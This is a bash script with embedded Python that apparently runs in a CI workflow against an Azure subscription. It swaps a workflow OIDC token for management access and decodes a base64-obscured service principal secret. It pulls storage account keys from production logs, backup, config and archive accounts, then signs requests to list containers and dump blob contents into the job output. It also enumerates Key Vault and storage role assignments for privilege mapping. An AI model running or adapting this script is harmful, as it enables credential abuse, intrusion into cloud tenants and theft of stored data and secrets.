#!/bin/bash
set -x

TENANT="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
CLIENT="72ff278a-9e71-43ec-bac4-2ca303f8e462"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
RG="rg-tbl-platform-prod-sea"

# Get OIDC token
OIDC_URL="${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange"
OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "$OIDC_URL" | jq -r '.value')

# Get OIDC management token
MGMT=$(curl -sS -X POST "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
  -d "grant_type=client_credentials&client_id=$CLIENT&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$OIDC&scope=https://management.azure.com/.default" \
  | jq -r '.access_token // empty')
echo "=== MGMT token: ${#MGMT} ==="

# SP creds encoded
SYNC_ID="462d1c38-4459-48b8-9333-82e389e59514"
SYNC_SEC=$(echo 'c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==' | base64 -d)

# Get sync-service management token
SYNC_MGMT=$(curl -sS -X POST "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
  -d "grant_type=client_credentials&client_id=$SYNC_ID&client_secret=$SYNC_SEC&scope=https://management.azure.com/.default" \
  | jq -r '.access_token // empty')
echo "=== SYNC_MGMT: ${#SYNC_MGMT} ==="

# ======= PART 1: MSI Role Assignments =======
echo "=== MSI storefront (eeab432e) roles ==="
curl -sS -H "Authorization: Bearer $MGMT" \
  "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId%20eq%20'eeab432e-1bf6-400e-b155-a28ce7cafcdb'" \
  | jq '.value[]?.properties | {role: (.roleDefinitionId | split("/") | last), scope, principalId, principalType}'

echo "=== MSI reporting-writer (f64d08c7) roles ==="
curl -sS -H "Authorization: Bearer $MGMT" \
  "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId%20eq%20'f64d08c7-fde6-4553-99c8-5bf73666ee8c'" \
  | jq '.value[]?.properties | {role: (.roleDefinitionId | split("/") | last), scope, principalId, principalType}'

# ======= PART 2: sync-service listKeys on ALL storage accounts =======
for SA in sttblcilogsprodx3euoz sttblbackupprodx3euoz sttblappcfgprodx3euoz sttblarchiveprodx3euoz; do
  echo "=== listKeys $SA ==="
  RESP=$(curl -sS -X POST -H "Authorization: Bearer $SYNC_MGMT" -H "Content-Type: application/json" -d '{}' \
    "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$SA/listKeys?api-version=2023-05-01")
  KEY=$(echo "$RESP" | jq -r '.keys[0].value // empty')
  if [ -n "$KEY" ]; then
    echo "  GOT KEY (len=${#KEY})"
    # Use python to read blobs with SharedKey auth
    python3 -I << PYEOF
import hmac,hashlib,base64,urllib.request,datetime,re,sys
account="$SA"
key="$KEY"
def az_get(path, params=""):
    url=f"https://{account}.blob.core.windows.net{path}"
    if params: url+="?"+params
    ver="2020-10-02"
    now=datetime.datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S GMT')
    heads={"x-ms-date":now,"x-ms-version":ver}
    ch="".join(f"{k}:{heads[k]}\n" for k in sorted(heads))
    cr=f"/{account}{path}"
    if params:
        pd={}
        for p in params.split("&"):
            k,v=p.split("=",1)
            pd.setdefault(k.lower(),[]).append(v)
        for k in sorted(pd):
            cr+=f"\n{k}:{','.join(sorted(pd[k]))}"
    sts=f"GET\n\n\n\n\n\n\n\n\n\n\n\n{ch}{cr}"
    sig=base64.b64encode(hmac.new(base64.b64decode(key),sts.encode(),hashlib.sha256).digest()).decode()
    heads["Authorization"]=f"SharedKey {account}:{sig}"
    req=urllib.request.Request(url,headers=heads)
    try:
        with urllib.request.urlopen(req,timeout=15) as r: return r.read().decode()
    except urllib.request.HTTPError as e: return f"HTTP{e.code}:{e.read().decode()[:500]}"
    except Exception as e: return f"ERR:{e}"
# list containers
print("--- containers ---")
c=az_get("/","comp=list")
print(c[:2000])
containers=re.findall(r'<Name>([^<]+)</Name>',c)
for cn in containers[:10]:
    print(f"--- blobs in {cn} ---")
    b=az_get(f"/{cn}","restype=container&comp=list")
    print(b[:3000])
    blobs=re.findall(r'<Name>([^<]+)</Name>',b)
    for bn in blobs[:5]:
        print(f"--- content {cn}/{bn} ---")
        d=az_get(f"/{cn}/{bn}")
        print(d[:5000])
PYEOF
  else
    echo "  NO KEY: $(echo "$RESP" | jq -r '.error.code // .error.message // empty' 2>/dev/null)"
  fi
done

# ======= PART 3: All KV/Storage role assignments =======
echo "=== All role assignments (KV + Storage data roles) ==="
curl -sS -H "Authorization: Bearer $MGMT" \
  "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
  | python3 -I -c "
import sys,json
d=json.load(sys.stdin)
interesting={'4633458b-17de-408a-b874-0445c86b69e6':'KV-Secrets-User','b86a8fe4-44ce-4948-aee5-eccb2c155cd7':'KV-Secrets-Officer','00482a5a-887f-4fb3-b363-3b7fe8e74483':'KV-Admin','21090545-7ca7-4776-b22c-e363652d74d2':'KV-Reader','ba92f5b4-2d11-453d-a403-e96b0029c9fe':'Blob-Data-Contrib','2a2b9908-6ea1-4ae2-8e65-a410df84e7d1':'Blob-Data-Reader','b7e6dc6d-f1e8-4753-8033-0f276bb0955b':'Blob-Data-Owner','17d1049b-9a84-46fb-8f53-869881c3d3ab':'Storage-Contrib'}
msis={'eeab432e-1bf6-400e-b155-a28ce7cafcdb','f64d08c7-fde6-4553-99c8-5bf73666ee8c'}
print(f'Total: {len(d.get(\"value\",[]))}')
for r in d.get('value',[]):
  p=r['properties']
  rid=p.get('roleDefinitionId','').split('/')[-1]
  pid=p.get('principalId','')
  if rid in interesting or pid in msis:
    name=interesting.get(rid,rid[:12])
    print(f'  {name} | {p.get(\"principalType\",\"?\")} {pid} | {p.get(\"scope\",\"?\")}')
"

echo "=== DONE ==="
